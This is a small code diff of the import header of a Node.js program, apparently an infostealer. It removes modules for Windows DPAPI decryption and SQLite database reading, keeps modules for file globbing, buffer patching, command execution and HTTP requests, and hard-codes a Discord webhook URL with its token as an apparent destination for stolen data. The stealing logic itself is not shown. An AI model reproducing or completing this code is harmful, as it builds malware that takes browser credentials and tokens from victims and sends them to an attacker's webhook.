@@ -1,17 +1,7 @@
-var path  = require('path')
-const os = require('os')
-var dpapi = require("nexe-natives")(require.resolve('win-dpapi'));
-var sqlite3 = require("nexe-natives")(require.resolve('sqlite3')),
-        url = require('url'),
-        crypto = require('crypto'),
-        fs = require('fs'),
-        ITERATIONS,
-        dbClosed = false;
 var glob = require("glob");
+const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
-
-const { execSync } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "https://discord.com/api/webhooks/940982814969585664/B_1F-VUnsc0hzFgNN3plniy44FwUetvDhiUsd94WH9rhwNvqEfiFM1Fb2bLdv4hCBJl2"
